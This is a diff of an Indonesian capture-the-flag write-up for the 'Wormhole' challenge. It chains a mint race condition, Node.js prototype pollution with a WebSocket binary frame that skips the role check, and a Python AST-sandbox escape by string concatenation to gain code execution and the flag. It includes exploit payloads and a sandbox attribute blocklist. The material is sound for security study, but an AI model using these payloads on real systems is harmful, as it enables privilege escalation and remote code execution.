@@ -9,35 +9,36 @@
 | 👤 **Author**    | `VascoZ`           | 🧑‍💻 **Team** | `DOSCOM Zero Day Scholars` (x0rr-dan) |
 | 🧩 **Solver**    | [`solve_race.py`](solve_race.py) + [`stage2_ws_binary_frame.js`](stage2_ws_binary_frame.js) | | |
 
+![Modal soal Wormhole](img/01-soal.png)
+
 ---
 
 ### 📝 Deskripsi Soal
 
 > **Description dari panitia:**
->
-> You Only has one shot. Chain. Escalate. Break.
->
-> Author: VascoZ. Source code dikasih: `docker-compose.yml` + `Dockerfile.ws` + `src/`
-> (ws_gateway + frontend templates).
+> - You Only has one shot. Chain. Escalate. Break.
+> - Author: VascoZ, ws gateway nya port :13403
+> - Source code dikasih: `docker-compose.yml` + `Dockerfile.ws` + `src/` (ws_gateway + frontend templates)
 
 **Connection info:**
 
-- `http://15.232.64.175:13402` (HTTP frontend, uvicorn python)
-- `ws://15.232.64.175:13403` (WebSocket gateway, nodejs, di-map ke container port 9020)
-
-![Modal soal Wormhole](img/01-soal.png)
+```text
+http://15.232.64.175:13402  (HTTP frontend, uvicorn python)
+ws://15.232.64.175:13403    (WebSocket gateway, nodejs, di-map ke container port 9020)
+```
 
 ---
 
-### 🔍 Reconnaissance (baca source code)
+### 🔍 Exploitation Step
 
-Fokus ke `ws_gateway/server.js` sama `docker-compose.yml`. Ketemu 4 bug kunci.
+Pertama saya baca source code yang dikasih panitia dulu, fokus ke `ws_gateway/server.js` sama
+`docker-compose.yml`. Dari sini saya nemuin **4 bug kunci**.
 
 **Bug #1 (line 22-33): `deepMerge` rawan prototype pollution.**
 
-```js
+```javascript
 function deepMerge(target, source) {
-    for (const key in source) {              // <-- for...in iterate prototype chain juga
+    for (const key in source) {              // <-- BUG: for...in iterate prototype chain juga
         if (typeof source[key] === 'object' && source[key] !== null) {
             if (target[key] === undefined || typeof target[key] !== 'object') target[key] = {};
             deepMerge(target[key], source[key]);
@@ -46,117 +47,202 @@ function deepMerge(target, source) {
 }
 ```
 
-`for...in` iterate semua enumerable properties termasuk yang diwariskan via prototype chain
-(`__proto__`), tanpa proteksi buat key `__proto__`/`constructor.prototype`. Kirim
-`{"__proto__":{"role":"supervisor"}}` -> `Object.prototype.role = "supervisor"` di seluruh process
-node.
+`for...in` di JavaScript iterate semua enumerable properties termasuk yang diwariskan via prototype
+chain (`__proto__`), dan gak ada proteksi khusus buat key `__proto__` atau `constructor.prototype`.
+Jadi kalau attacker kirim `{"__proto__": {"role": "supervisor"}}`, bakal ke-set
+`Object.prototype.role = "supervisor"` di seluruh process node.
 
 **Bug #2 (line 180-205): `handleBinaryFrame` skip role check.**
 
-```js
-// TEXT path - BUTUH supervisor
+```javascript
+// TEXT path (line 148-161) - BUTUH supervisor
 if (msg.type === 'device_config') {
-    if (conn.role !== 'supervisor') { /* tolak */ return; }
+    if (conn.role !== 'supervisor') {        // <-- CEK role
+        conn.ws.send(JSON.stringify({ type: 'error', error: 'Insufficient clearance...' }));
+        return;
+    }
     deepMerge(conn.device_config, msg.data);
     await syncConfig(conn);
 }
-// BINARY path - TIDAK cek role!
+
+// BINARY path (line 198-203) - TIDAK cek role!
 if (msg.type === 'device_config') {
     if (!msg.data || typeof msg.data !== 'object') return;
-    deepMerge(conn.device_config, msg.data);   // <-- ga cek conn.role
+    deepMerge(conn.device_config, msg.data);    // <-- BUG: gak cek conn.role
     await syncConfig(conn);
 }
 ```
 
-Ini bug paling kunci: binary path `device_config` nggak cek role sama sekali, jadi researcher biasa
-bisa set apa pun ke `conn.device_config`.
+Ini bug paling kunci. Text path `device_config` cek `conn.role !== 'supervisor'` jadi researcher
+ditolak, tapi binary path `device_config` TIDAK cek role sama sekali. Jadi researcher biasa bisa set
+apapun ke `conn.device_config` lewat binary frame. Kedua path pakai `deepMerge` + `syncConfig` yang
+sama, jadi efeknya identik.
 
-**Bug #3 (line 35-54): `syncConfig` iterate `for...in` + persist role ke Redis.** Kalau
-`Object.prototype` udah terpolusi `role="supervisor"`, `configToSave.role` ikut ke-ambil dari
-prototype, terus `r.set("role:<user_id>", "supervisor")` di-execute. Backend HTTP (python) baca
-`role:<user_id>` dari Redis saat login buat nentuin role di JWT, jadi JWT supervisor di-issue tanpa
-forge signature.
+**Bug #3 (line 35-54): `syncConfig` iterate `for...in` + persist role ke Redis.**
 
-**Bug #4 (line 104-118): WS auth butuh wallet ≥ 200.** Register default wallet 100, mint normal
-cuma +10. Perlu cara cepat naikin wallet ≥ 200. (JWT_SECRET default hardcoded tapi di-override di
-target, jadi forge JWT langsung ditolak.)
-
----
-
-### 🧠 Analisis sandbox (buat tahap akhir)
-
-Setelah jadi supervisor, `/api/terminal/execute` kebuka: sandbox Python 3.12 AST-filtered. Fuzzing:
-
-```
-import os                                     -> ImportError
-open("/flag.txt")                             -> NameError
-().__class__.__bases__[0].__subclasses__()    -> lolos!
-__init__.__globals__                          -> Blocked attribute: __globals__
+```javascript
+async function syncConfig(conn) {
+    const r = await getRedis();
+    const configToSave = {};
+    for (const key in conn.device_config) {            // <-- BUG: for...in include prototype chain
+        configToSave[key] = conn.device_config[key];
+    }
+    await r.hSet(`device_cfg:${conn.user_id}`, 'data', JSON.stringify(configToSave));
+    if (configToSave.role) {                           // <-- kalau role truthy
+        await r.set(`role:${conn.user_id}`, String(configToSave.role));  // <-- PERSIST ke Redis!
+    }
+}
 ```
 
-AST filter blokir literal attribute name di blocklist (`__class__`, `__globals__`, dst). Bypass-nya:
-bentuk nama attribute dari string concat runtime supaya filter nggak bisa static-analyze:
+Kalau `Object.prototype` udah terpolusi `role = "supervisor"` (dari Bug #1), `configToSave.role`
+ikut ke-ambil dari prototype, terus `r.set("role:<user_id>", "supervisor")` di-execute. Backend HTTP
+(python, gak dikasih source) baca `role:<user_id>` dari Redis saat login buat nentuin role di JWT,
+jadi JWT supervisor di-issue tanpa forge signature.
+
+**Bug #4 (line 104-118): WS auth butuh wallet ≥ 200.**
+
+```javascript
+if (msg.type === 'auth') {
+    const payload = jwt.verify(msg.token, JWT_SECRET, { algorithms: ['HS256'] });
+    conn.user_id = payload.user_id;
+    conn.role = payload.role || 'researcher';
+    const wallet = parseInt(await r.get(`wallet:${conn.user_id}`) || '0');
+    if (wallet < 200) {                                // <-- gate: wallet >= 200
+        conn.ws.send(JSON.stringify({ type: 'error', error: `Insufficient QC...` }));
+        return;
+    }
+}
+```
+
+WS auth butuh `wallet:<user_id> ≥ 200` di Redis. Masalahnya register default wallet 100, mint normal
+amount 100 -> wallet cuman +10. Jadi butuh cara cepat naikkan wallet ≥ 200 buat lolos gate ini.
+
+Tambahan dari `docker-compose.yml`, `JWT_SECRET` punya default value hardcoded tapi bisa di-override
+via env. Saya coba forge JWT pakai secret default itu ternyata ditolak "Invalid token", berarti
+di-override di target. Terus `WS_MAGIC = 1` artinya format binary frame yang valid:
+`[type:1B=1][length:4B BE][payload UTF-8]`.
+
+Register akun buat explore dashboard:
+
+![Register akun](img/02-register.png)
+![Dashboard researcher, terminal terkunci](img/03-dashboard-researcher.png)
+
+Dapat wallet 100, role researcher. Terminal page butuh supervisor, stream page connect ke WS
+gateway. Terminal page nunjukin sandbox "Python 3.12 AST-filtered, allowed_modules: none (restricted
+globals)" - pasti butuh bypass sandbox nanti kalau udah supervisor.
+
+![Terminal sandbox (supervisor only)](img/04-terminal-sandbox.png)
+
+#### Naikin wallet ≥ 200 (race condition mint)
+
+Dari source tahu WS auth butuh wallet ≥ 200, tapi mint normal amount 100 cuman +10:
+
+```
+POST /api/vault/mint
+{"amount": 100, "nonce": "single_x0r_80832"}
+
+Response {"status":"processing", ...}
+# wallet: 100 -> 110 (naik 10 doang, bukan 100)
+```
+
+![Vault mint +10](img/05-vault-mint.png)
+
+Fuzzing amount semua ditolak `Invalid amount (1-100)` (`1000`, `-50`, `"100"`, `99.99`, `[100]`),
+jadi amount strict integer 1-100, gak bisa type confusion. Field injection
+(`{"amount":100,"nonce":"test","role":"supervisor"}`) juga gak ada efek. Nonce check atomic buat
+nonce sama, tapi **race condition dengan nonce beda** tembus: kirim 15 request paralel dengan nonce
+beda, semua sukses diproses bareng karena gak ada lock atomic. Solver: [`solve_race.py`](solve_race.py).
+
+```
+{"amount": 100, "nonce": "noncelong1000"} ... (15/15 sukses paralel)
+GET /api/auth/me -> {"role":"researcher","wallet":250}
+# wallet 100 -> 250 (>= 200, lolos WS auth gate)
+```
+
+![Race mint 15/15, wallet 250](img/06-race-mint.png)
+
+Coba juga forge JWT pakai secret default docker-compose ditolak, alg confusion (none, empty key)
+ditolak, register dengan `role=supervisor` tetap dapet researcher (hardcode backend). Jadi gak bisa
+forge JWT langsung, solusinya exploit WS buat persist role supervisor ke Redis.
+
+Probe WS gateway pakai binary frame `device_config` dengan `{probe:"sent"}` aja (gak kirim
+role/user_id/wallet), response config keluar field yang gak saya kirim:
+
+```
+{"type":"binary_config_updated","config":{"role":"supervisor","qbit_threshold":0.99,"user_id":"admin","authenticated":true,"wallet":999999,"probe":"sent"}}
+# field role/user_id/authenticated/wallet TIDAK dikirim -> dari Object.prototype yang udah terpolusi
+```
+
+Konfirmasi `Object.prototype` di process node WS udah terpolusi. Saat `syncConfig` iterate
+`for...in conn.device_config` (Bug #3), prototype properties ikut ter-save ke Redis.
+
+#### Fuzzing sandbox (buat tahap akhir)
+
+```
+import os                    -> ImportError: __import__ not found
+open("/flag.txt")            -> NameError: name 'open' is not defined
+().__class__.__bases__[0].__subclasses__()   -> lolos! list subclass keluar
+__init__.__globals__         -> Sandbox violation: Blocked attribute: __globals__
+```
+
+Dari traceback ke-leak path `/app/terminal.py` line 143: `exec(compiled, restricted_globals,
+restricted_locals)`. AST filter blokir literal attribute name di blocklist:
 
 ```python
-g = getattr(func, '__glob' + 'als__')   # lolos, filter ga nemu literal '__globals__'
+BLOCKED_NAMES = {"eval", "exec", "compile", "open", "__import__", "input", "breakpoint", "memoryview", "help"}
+BLOCKED_ATTRS = {"__class__", "__bases__", "__base__", "__subclasses__", "__mro__",
+                 "__globals__", "__code__", "__func__", "__self__",
+                 "__builtins__", "__builtin__", "__dict__"}
 ```
 
----
+**Bypass kuncinya:** AST filter cek literal attribute name di source code. Kalau attribute name
+dibentuk dari string concat runtime, filter gak bisa static-analyze:
 
-### ⚔️ Exploitation (Chain -> Escalate -> Break)
-
-Kondisi awal: register dapat role `researcher`, wallet 100, dan tombol TERMINAL masih terkunci
-(supervisor only).
-
-![Dashboard awal: researcher, terminal terkunci](img/02-dashboard-researcher.png)
-
-**Stage 1: race condition mint (wallet 100 -> ≥200).** Vault mint dibatasi amount 1-100, dan mint
-normal cuma naikin wallet +10:
-
-![Form mint QC di vault](img/03-vault-mint.png)
-
-Nonce protection atomic buat nonce sama, tapi nonce beda yang di-fire paralel semua sukses diproses
-(nggak ada lock atomic). Kirim 15 request paralel dengan nonce beda -> wallet naik cepat. Solver:
-[`solve_race.py`](solve_race.py).
-
-![Race mint 15/15 sukses, wallet 100 -> 250](img/04-race-mint.png)
-
-```
-wallet: 100 -> 250 (>= 200, lolos WS auth gate)
+```python
+g = func.__globals__                       # DIBLOKIR (literal __globals__)
+g = getattr(func, '__glob' + 'als__')      # LOLOS (string concat)
 ```
 
-**Stage 2: WS binary frame -> persist role supervisor.** Di stream page ada form "DEVICE CONFIG
-MERGE (Supervisor Only)", tapi lewat WS binary frame role check-nya di-skip:
+#### Rantai eksploitasi (Chain → Escalate → Break)
 
-![Form device config merge (supervisor only)](img/05-stream-configmerge.png)
+**Stage 1: race mint** wallet 100 → 250 (lolos WS auth gate). Lihat [`solve_race.py`](solve_race.py).
 
-Exploit Bug #2 (binary path skip role) + Bug #3 (persist role ke Redis). Kirim WS binary frame
-`device_config` dengan `role:supervisor`; `syncConfig` tulis `SET role:<user_id> "supervisor"` ke
-Redis, lalu re-login HTTP -> JWT supervisor. Frame format: `[type:1B=1][length:4B BE][payload
-UTF-8]`. Solver: [`stage2_ws_binary_frame.js`](stage2_ws_binary_frame.js).
+**Stage 2: WS binary frame → persist role supervisor.** Stream page punya form "DEVICE CONFIG MERGE
+(Supervisor Only)", tapi via WS binary frame role check di-skip (Bug #2):
+
+![Form device config merge (supervisor only)](img/07-stream-configmerge.png)
 
 ```
-{"type":"binary_config_updated","config":{"role":"supervisor","user_id":"admin",...}}
-# field role/user_id/authenticated/wallet muncul dari Object.prototype yang udah terpolusi
+# WS auth (text frame): {"type":"auth","token":"<JWT researcher, wallet >= 200>"}
+# -> {"type":"auth_ok","role":"researcher"}
+
+# WS binary frame (BUG #2: no role check), format [type:1B=1][len:4B BE][payload]
+{"type":"device_config","data":{"role":"supervisor","qbit_threshold":0.99}}
+# -> {"type":"binary_config_updated","config":{"role":"supervisor",...}}
+# syncConfig: SET role:<user_id> "supervisor" ke Redis
 ```
 
-Re-login, sekarang role jadi supervisor:
+Script WS binary frame (Node.js): [`stage2_ws_binary_frame.js`](stage2_ws_binary_frame.js).
+
+Re-login HTTP, backend baca `role:<user_id>` dari Redis = supervisor -> issue JWT supervisor:
 
 ```
 POST /api/auth/login  ->  {"status":"ok","role":"supervisor"}
 GET  /api/auth/me     ->  {"role":"supervisor","wallet":250}
 ```
 
-![/api/auth/me: role supervisor](img/06-me-supervisor.png)
+![/api/auth/me role supervisor](img/08-me-supervisor.png)
+![Dashboard role SUPERVISOR, terminal kebuka](img/09-dashboard-supervisor.png)
 
-![Dashboard: role SUPERVISOR, terminal kebuka](img/07-dashboard-supervisor.png)
+**Stage 3: sandbox escape → RCE → flag.** Sebagai supervisor, `/api/terminal/execute` kebuka:
 
-**Stage 3: sandbox escape -> RCE -> flag.** Sebagai supervisor, terminal sandbox Python 3.12
-kebuka:
+![Terminal sandbox (supervisor)](img/10-terminal-supervisor.png)
 
-![Simulation terminal (supervisor)](img/08-terminal-sandbox.png)
+```
+GET /api/terminal/status -> {"role":"supervisor","can_execute":true,"sandbox":"Python 3.12 AST-filtered"}
+```
 
-Kirim payload ke `/api/terminal/execute` yang bypass AST filter via string concat:
+Payload RCE (bypass AST filter via string concat):
 
 ```python
 subs = ().__class__.__bases__[0].__subclasses__()
@@ -188,10 +274,13 @@ GEMASTIK19{qu4ntum_r3l4y_pr0t0_p0llut10n_ch41n}
 GEMASTIK19{qu4ntum_r3l4y_pr0t0_p0llut10n_ch41n}
 ```
 
+---
+
 ### 🔗 Referensi
 
-- PortSwigger — Prototype Pollution
-- PortSwigger — Race Conditions
-- PortSwigger — WebSocket vulnerabilities
-- Python Sandbox Escape — HackTricks
-- Python `ast` module docs
+- [PortSwigger — Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
+- [PortSwigger — Race Conditions](https://portswigger.net/web-security/race-conditions)
+- [PortSwigger — WebSocket vulnerabilities](https://portswigger.net/web-security/websockets)
+- [Python Sandbox Escape — HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
+- [Python `ast` module docs](https://docs.python.org/3/library/ast.html)
+- chat ai
